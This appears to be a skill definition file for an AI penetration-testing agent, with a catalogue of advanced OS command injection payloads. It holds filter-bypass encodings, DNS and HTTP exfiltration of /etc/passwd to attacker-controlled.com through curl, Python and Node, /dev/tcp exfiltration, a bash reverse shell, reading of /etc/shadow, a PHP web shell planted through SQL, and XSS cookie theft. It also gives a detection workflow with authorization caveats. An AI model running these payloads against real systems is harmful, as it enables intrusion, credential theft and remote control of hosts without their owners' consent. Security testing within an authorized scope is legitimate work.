---
name: command-injection-advanced
description: "Advanced command injection with filter bypass, encoding tricks, OOB exfiltration, and polyglot payloads"
category: specialized
tier: powerful
toolRefs: [httpRequest, parseResponse, measureTiming, compareResponses, updateGraph, writeFinding, followRedirects, recordEvidence, getCapturedHeaders, runPrimitive]
primitives: [rceClass]
triggers: ["advanced command injection", "command injection bypass", "os command injection", "rce injection", "shell injection", "command filter bypass", "blind command injection", "out of band command", "polyglot injection", "code injection"]
contextBoosts: [sqli]
mitreAttack: ["T1059", "T1059.004", "T1190"]
owaspRefs: ["OWASP Top 10 A03:2021 Injection", "OWASP OS Command Injection"]
---

# Advanced Command Injection

## When to Use

- Input is passed to a system shell, exec, system, popen, or similar OS-level execution functions
- Application performs file operations, network calls, or system tasks based on user-controlled parameters
- Blind injection points where output is not directly returned but side effects (timing, DNS, file writes) are observable
- WAF or input filters are in place and standard payloads are blocked
- Target environment runs PHP, Java, Python, Node.js, or any language that interfaces with the OS shell
- Time-based or out-of-band detection is the only viable confirmation method
- You need to bypass allowlists, blocklists, or regex-based input sanitization

## Do Not Use

- Input is handled purely by language-level interpreters (SQL, template engines, JSON parsers) without OS shell invocation
- Target is a static site or fully sandboxed container with no shell access
- Injection point only affects client-side JavaScript execution
- You have not confirmed the input reaches a command execution sink (avoid guessing)
- Destructive payloads against production systems without explicit authorization

## Auth Context

Before any injection test, call `getCapturedHeaders` to retrieve session tokens, CSRF tokens, and authentication headers. Command injection in authenticated contexts may produce different output or require valid session state to reach the execution sink. Replay captured cookies and authorization headers with every probe request. Authenticated injection points often have stricter filtering — document the auth requirement for each finding.

## Filter Bypass Techniques

### IFS Bypass

The Internal Field Separator (`$IFS`) acts as whitespace in bash when spaces are filtered:

```bash
cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
{cat,/etc/passwd}
```

Alternative IFS values:

```bash
# $IFS defaults to space/tab/newline — unexpanded, it works as a separator
cat$IFS/etc/passwd

# $IFS$9 appends the 9th positional arg (empty) to survive stricter filters
ls$IFS$9-la

# URL-encoded tab (%09) and newline (%0a) as separators when $ is filtered
cat%09/etc/passwd
cat%0a/etc/passwd
```


### Hex Encoding

Bypass character filters using hex-encoded command strings:

```bash
# ANSI-C quoting: hex escapes expand to "cat /etc/passwd"
$'\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'

# printf inside command substitution — survives quote filtering
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")

# Hex-encode only the blocked keyword, keep the rest literal
$(printf '\x69\x64')   # → id
```

### Octal Encoding

```bash
$'\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144'

$(printf '\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144')

# Octal via backslash-octal escape in ANSI-C quoting: \151\144 → id
$'\151\144'
```

### Wildcards

Use glob wildcards to construct commands without using the actual characters:

```bash
/???/??t /???/p?sswd          # /bin/cat /etc/passwd
/?s?/?in/?s? -al /            # /sbin/ls or /usr/bin/ls variants
cat /etc/p*sswd               # glob the filename
/*/*/cat /??c/p?????d         # deeper-path globs
```

### Brace Expansion

Bash brace expansion bypasses space and keyword filters:

```bash
{cat,/etc/passwd}
{ls,-la,/tmp}
{echo,test}
```

Combined with IFS:

```bash
{cat}${IFS}/etc/passwd
{echo}${IFS}INJECT_MARKER
```

### Null Byte Injection

Null bytes may truncate strings in certain parsers while passing validation:

```
file.txt%00.pdf        # extension validation sees .pdf, parser stops at %00
id%00                  # trailing filter string discarded after the null byte
```

PHP-specific null byte handling (PHP < 5.3.4 in filesystem functions):

```php
// vulnerable: file_get_contents("uploads/" . $_GET['f'] . ".log")
GET /download.php?f=../../etc/passwd%00.log HTTP/1.1
```

## Blind Exfiltration Techniques

### DNS Exfiltration

When no output is returned, exfiltrate data via DNS queries:

**Linux:**

```bash
; nslookup $(whoami).attacker-controlled.com
; nslookup `whoami`.attacker-controlled.com
```

**Simplified DNS leak:**

```bash
; ping -c 1 $(hostname).attacker-controlled.com
; curl http://$(id | base64 | tr -d '\n').attacker-controlled.com --max-time 3
```

**PHP-specific:**

```bash
; php -r 'file_get_contents("http://attacker-controlled.com/?d=".urlencode(base64_encode(shell_exec("id"))));'
```

### HTTP Exfiltration

Exfiltrate data via HTTP requests to an external server:

**Using curl:**

```bash
; cat /etc/passwd | curl -X POST --data-binary @- http://attacker-controlled.com/recv
; curl http://attacker-controlled.com/recv?d=$(cat /etc/passwd | base64 | tr -d '\n')
```

**Using Python:**

```bash
; python -c "import urllib.request;urllib.request.urlopen(urllib.request.Request('http://attacker-controlled.com/recv',data=open('/etc/passwd','rb').read()))"
```

**Using Node.js:**

```bash
; node -e "require('http').request({host:'attacker-controlled.com',port:80,method:'POST',path:'/recv'},()=>process.exit()).end(require('fs').readFileSync('/etc/passwd'))"
```

### File-Based Exfiltration

Write output to a file that can be retrieved through a web-accessible directory:

```bash
; cp /etc/passwd /var/www/html/static/info.txt
; cat /etc/passwd > /var/www/html/uploads/out.txt
```

Combined with web server access:

```http
GET /static/info.txt HTTP/1.1
Host: target.com

GET /uploads/out.txt HTTP/1.1
Host: target.com
```


## Time-Based Detection

When no output channel exists, use timing to confirm injection:

### Sleep-Based

```bash
; sleep 5
| sleep 5
&& sleep 10
$(sleep 7)
`sleep 7`
```

Windows equivalents:

```bat
& timeout /t 5 & rem
| ping -n 6 127.0.0.1
```

### Conditional Timing

Only sleep if a condition is true:

```bash
; [ "$(whoami)" = "root" ] && sleep 5
; [ $(id -u) -eq 0 ] && sleep 5
; test -f /etc/shadow && sleep 5
```

### Timing-Based Data Extraction

Extract data bit by bit using timing:

```bash
# First character of a file: sleep only when it matches
; [ "$(head -c1 /etc/passwd)" = "r" ] && sleep 5

# Binary search on character codes — ~7 requests per character
; [ $(printf %d "'$(head -c1 /etc/passwd)") -gt 96 ] && sleep 5

# Extract from command output instead of files
; [ "$(whoami | cut -c1)" = "r" ] && sleep 5
```

### /dev/tcp Blind Channel

Bash `/dev/tcp` for blind data transfer:

```bash
; cat /etc/passwd > /dev/tcp/attacker-controlled.com/4444
; bash -c 'cat /etc/passwd > /dev/tcp/attacker-controlled.com/4444'
```

Reverse shell via `/dev/tcp`:

```bash
; bash -i >& /dev/tcp/attacker-controlled.com/4444 0>&1
```
## Encoding Techniques

### Hex Encoding

```bash
$'\x2f\x62\x69\x6e\x2f\x73\x68' -c 'id'
$(printf '\x77\x68\x6f\x61\x6d\x69')
```

### Octal Encoding

```bash
$'\151\144'
$(printf '\167\150\157\141\155\151')
```

### Unicode Encoding

```bash
$'\u0069\u0064'
echo -e '\u0069\u0064'
```

### Base64 Encoding

```bash
; echo aWQ= | base64 -d | bash            # "aWQ=" → id
; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash   # → cat /etc/passwd
; printf %s $(echo aWQ= | base64 -d) | sh
```

### Subshell / Command Substitution

```bash
$(whoami)
`whoami`
$(cat /etc/passwd)
```

### Variable Expansion

```bash
; a=id;$a
; c1=ca;c2=t;c3=/etc/passwd; $c1$c2 $c3
; ${HOME:0:1}    # "/" without typing the slash
```

### Arithmetic Expansion

```bash
# Parameter expansion builds digits without literal numbers (filters that block digits fail)
${##}                       # → 0
${###}                      # → 1
$(( ${###} << ${###} ))     # → 2
$(( ${##}${###} ))          # → 1  (string concat inside arithmetic)

# Arithmetic evaluates before execution — combine with printf octal to build chars:
$(printf \\$(printf '%03o' $(( ${###}0*6 + ${###} ))))   # \151 → i
```
## Alternative Delimiters

Different shells and execution contexts support various command separators:

| Delimiter | Example | Notes |
|-----------|---------|-------|
| Backticks | `` `id` `` | Universal in bash/sh |
| `$()` | `$(id)` | Modern shell substitution |
| `${}` | `${cmd}` | Variable expansion context |
| `\|` (pipe) | `ls \| id` | Output piped to next command |
| `\|\|` (OR) | `id \|\| true` | Execute if previous fails |
| `&&` (AND) | `id && whoami` | Execute if previous succeeds |
| `;` (semicolon) | `id; whoami` | Sequential execution |
| Newline | `id%0a whoami` | URL-encoded newline |
| `%0d%0a` | `id%0d%0awhoami` | CRLF injection |
| `{}` | `{id,whoami}` | Brace expansion |
| `<>` | `</etc/passwd` | Redirect (limited) |
| `&` | `id&` | Background execution |

### Newline Injection

URL-encoded newline to inject new commands:

```http
GET /api/ping?host=127.0.0.1%0awhoami HTTP/1.1

GET /api/ping?host=127.0.0.1%0d%0awhoami HTTP/1.1

POST /api/export HTTP/1.1
Content-Type: application/x-www-form-urlencoded

target=report.pdf%0aid%0acat${IFS}/etc/passwd
```

### Pipe Chains

```bash
| cat /etc/passwd | base64
|| id; ls / | head -5
; cat /etc/shadow | grep root | cut -d: -f2 | base64 -w0
```
## OS-Specific Differences

### Linux

- Uses `/bin/sh`, `/bin/bash`, or `/bin/dash`
- File paths: `/etc/passwd`, `/etc/shadow`, `/tmp`
- Commands: `id`, `whoami`, `cat`, `ls`, `wget`, `curl`, `nc`
- Wildcards: `?`, `*`, `[a-z]`
- Null bytes: often ineffective (kernel rejects)
- Process substitution: `<()`, `>()`
- `/dev/tcp` available in bash

### Windows

- Uses `cmd.exe`, `powershell.exe`, or `pwsh`
- File paths: `C:\Windows\System32`, `C:\Users`, `C:\temp`
- Commands: `whoami`, `dir`, `type`, `powershell`, `certutil`
- Wildcards: `?`, `*`
- Null bytes: may truncate strings in some contexts
- Environment variables: `%PATH%`, `%TEMP%`
- Pipe and redirect: same as Linux but with `findstr` instead of `grep`

**Windows-specific bypasses:**

```bat
:: caret escape defeats keyword blocklists (cmd strips ^ before execution)
w^h^o^a^m^i
c^m^d /c ^c^a^t C:\Windows\win.ini

:: environment-variable substring tricks
%COMSPEC:~-6%            :: → "cmd.exe"
echo %PATH:~0,1%         :: → "C"

:: separators
ipconfig & whoami
ipconfig && whoami
ipconfig || whoami

:: FORFILES as an alternate execution primitive
forfiles /p c:\windows\system32 /m cmd.exe /c "cmd.exe /c whoami"
```

### PowerShell Encoding

```powershell
# -EncodedCommand takes Base64 of UTF-16LE — "whoami" encodes to dwBoAG8AYQBtAGkA
powershell -nop -enc dwBoAG8AYQBtAGkA

# Generate the encoded form locally for any command:
$cmd = 'Get-Content C:\Windows\win.ini'
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
```
## Polyglot Payloads

Payloads designed to execute across multiple injection contexts:

### Multi-Context Polyglot

```bash
;`id`;$(id)|id||id&&id;
```

Works with: semicolons, backticks, subshell, pipes, logical operators.

### SQL + Command Injection Polyglot

```sql
'; EXEC master..xp_cmdshell 'whoami'--

' UNION SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/html/x.php'--
```

### XSS + Command Injection Polyglot

```html
<!-- stored field that is both rendered in HTML and later passed to a shell -->
"><img src=x onerror="new Image().src='//attacker-controlled.com/h?'+document.cookie">
; nslookup $(whoami).attacker-controlled.com
```

### Template + Command Injection Polyglot

```
{{lipsum.__globals__['os'].popen('id').read()}}
${""}";system('id');//
<%= `id` %>
```

### Universal Blind Polyglot

Send each variant in sequence; whichever produces the matching delay identifies the honored delimiter:

```bash
x; sleep 5
x | sleep 5
x $(sleep 5)
x `sleep 5`
x && sleep 5
x || sleep 5
x%0asleep 5
x & sleep 5
```
Detects which delimiter the target processes by timing each variant.

## Anti-Hallucination

### Verification Protocol

1. **Command execution claims require output evidence** — `id` must produce `uid=`, `gid=`, or `groups=` in the response body
2. **Blind injection claims require side-effect evidence** — timing data, DNS callback, file write, or HTTP exfil must be observed
3. **Filter bypass claims require comparison** — show the blocked payload fails AND the bypass payload succeeds on the same endpoint
4. **Encoding claims require decoded verification** — show the encoded payload and confirm the decoded command executed
5. **File read claims require file content** — partial or full file content must appear in the response
6. **OS-specific claims require OS identification** — confirm the target OS before claiming Linux vs Windows differences
7. **Time-based claims require measurement** — document exact timing; if `sleep 5` does not cause a 5+ second delay, the payload did not execute
8. **Polyglot claims require multi-context proof** — demonstrate the payload works in more than one injection context
9. **Do not infer shell type from URL structure** — `/api/run` does not guarantee bash; confirm with `echo $0` or similar
10. **Document every request-response pair** — include the exact payload, the exact response, and the timing data

### Evidence Recording

For every confirmed command injection finding, record via `writeFinding`:
- **Endpoint**: Full URL, parameter name, and HTTP method
- **Payload**: Exact string injected (raw, not encoded)
- **Shell**: Identified shell or execution context with evidence
- **Filter bypass**: Whether WAF/filter was present and how it was bypassed
- **Exfiltration method**: Direct output, blind timing, DNS, HTTP, or file-based
- **OS**: Confirmed target operating system
- **Impact**: RCE, file read, file write, reverse shell, or data exfiltration
- **Request/Response**: Full HTTP exchange via `recordEvidence`
- **Timing**: If time-based, include request start, end, and delta

## Trigger Conditions

Activate when user input reaches an OS command execution sink — `system`/`exec`/`popen`/`shell_exec`/`Runtime.exec`/`ProcessBuilder`/`subprocess`/`child_process` — or when the app performs file/network/system tasks parameterized by user data (filename processing, ping/traceroute-style tools, PDF/image conversion, archive extraction). Trigger on blind endpoints where output is suppressed but timing, DNS, or file-write side effects are observable, and on WAF/allowlist/regex-filtered inputs needing bypass. Do not trigger on SQL/template/JSON-parser sinks (those are separate skills) or pure client-side JS execution.

## Detection Approach

First decide if the input reaches a shell or direct exec: send a benign delimiter (`;`, `&&`, `|`, newline) with a harmless command and compare output/status to a baseline. If output returns, classify the shell (Linux vs Windows by available commands) and the separators it honors. For blind sinks, pivot to out-of-band and timing: a DNS/HTTP callback carrying `whoami` output, or a measured `sleep` delay, proves execution even without visible output. When filters block keywords or characters (spaces, slashes, letters), escalate through bypass families in order of subtlety: IFS/whitespace substitution, then encoding (hex/octal/base64/`printf`), then wildcards and brace expansion, then variable/arithmetic concatenation, then polyglots that span multiple delimiters. Always prove a bypass by showing the original payload fails while the transformed one succeeds on the *same* endpoint. Reserve reverse-shell/file-write exfil only for confirmed execution with explicit scope.

## Pitfalls

- Claiming execution from a generic error or 500 — an error is not output; require `uid=`/`whoami` evidence or a callback.
- Single timing sample treated as blind confirmation — network jitter mimics sleep; repeat and compare true vs false conditions.
- Assuming bash on Windows and vice versa — separator and command semantics differ; confirm OS first.
- Overclaiming filter bypass from one success without showing the blocked variant fail on the same endpoint.
- Treating reflected input as RCE — the literal payload string appearing in a page is not command output.
- Null-byte tricks that fail on modern kernels (Linux rejects them); don't rely on them.
- Reverse shells/file writes without scope authorization — keep PoCs read-only/safe.

## Verification & Impact

CONFIRMED when the response shows actual command output (`uid=`, `whoami` value, or file contents) or an observed OAST callback/measured timing delta proves execution. SUSPECTED when only a status shift or single timing blip occurs with no second confirmation — record as candidate. Document impact by capability proven: arbitrary command execution (RCE), file read/write, data exfiltration (DNS/HTTP/file-based), or reverse-shell access; name the OS, shell, and filter bypass used. Capture full request/response and timing via `recordEvidence`.

## Primitive Execution

The attack classes above are executable through the primitive registry. Invoke each
primitive by its id below using the run-primitive execution tool instead of re-firing
payloads manually; confirmed results pass through the evidence gate and commit as
findings with exploit proofs automatically.

| Primitive id | Coverage |
|---|---|
| `rceClass` | command-injection / RCE class probes |
